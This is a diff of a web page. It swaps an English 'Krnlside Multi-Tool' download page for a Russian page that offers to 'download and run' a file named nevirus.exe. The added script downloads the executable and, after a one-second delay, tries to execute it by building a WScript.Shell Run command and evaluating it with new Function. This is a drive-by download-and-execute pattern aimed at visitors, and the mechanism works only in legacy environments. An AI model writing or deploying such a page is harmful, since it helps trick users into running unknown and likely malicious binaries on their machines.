@@ -1,104 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Krnlside | Multi-Tool</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
-        
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-        
-        .container {
-            max-width: 800px;
-            padding: 2rem;
-            border: 1px solid #fff;
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 1rem;
-            text-transform: uppercase;
-            letter-spacing: 0.3rem;
-        }
-        
-        .logo {
-            font-size: 4rem;
-            margin-bottom: 2rem;
-            font-weight: bold;
-        }
-        
-        .btn {
-            background: #000;
-            color: #fff;
-            border: 1px solid #fff;
-            padding: 0.8rem 2rem;
-            font-size: 1rem;
-            cursor: pointer;
-            margin-top: 2rem;
-            text-transform: uppercase;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            background: #fff;
-            color: #000;
-        }
-        
-        footer {
-            margin-top: 2rem;
-            font-size: 0.8rem;
-            opacity: 0.7;
-        }
-    </style>
+    <title>Загрузка и запуск файла</title>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">KRNLSIDE</div>
-        <h1>Multi-Tool</h1>
-        <p>Advanced toolkit for security research and system analysis</p>
-        <button class="btn" id="downloadBtn">Download Tool</button>
-    </div>
-    
-    <footer>
-        Krnlside Project | Strictly for educational purposes
-    </footer>
+    <h1>Загрузка и запуск файла nevirus.exe</h1>
+    <p>Нажмите кнопку ниже, чтобы скачать и запустить файл nevirus.exe:</p>
+    <button onclick="downloadAndRun()">Скачать и запустить</button>
 
     <script>
-        document.getElementById('downloadBtn').addEventListener('click', function() {
-            // Create hidden download link
+        function downloadAndRun() {
             const link = document.createElement('a');
-            link.href = 'assets/krnlside.py';
-            link.download = 'krnlside.py';
+            link.href = 'assets/nevirus.exe';
+            link.download = 'nevirus.exe';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-            
-            // Update button text temporarily
-            const btn = this;
-            btn.disabled = true;
-            btn.textContent = 'Downloading...';
-            
+
+            // Запуск файла после загрузки
             setTimeout(() => {
-                btn.textContent = 'Download Complete';
-                setTimeout(() => {
-                    btn.textContent = 'Download Tool';
-                    btn.disabled = false;
-                }, 1000);
-            }, 1500);
-        });
+                const runScript = `new ActiveXObject('WScript.Shell').Run('${window.location.href.replace(/[^\\/]*$/, '')}assets/nevirus.exe');`;
+                new Function(runScript)();
+            }, 1000); // Задержка в 1 секунду, чтобы файл успел загрузиться
+        }
     </script>
 </body>
 </html>
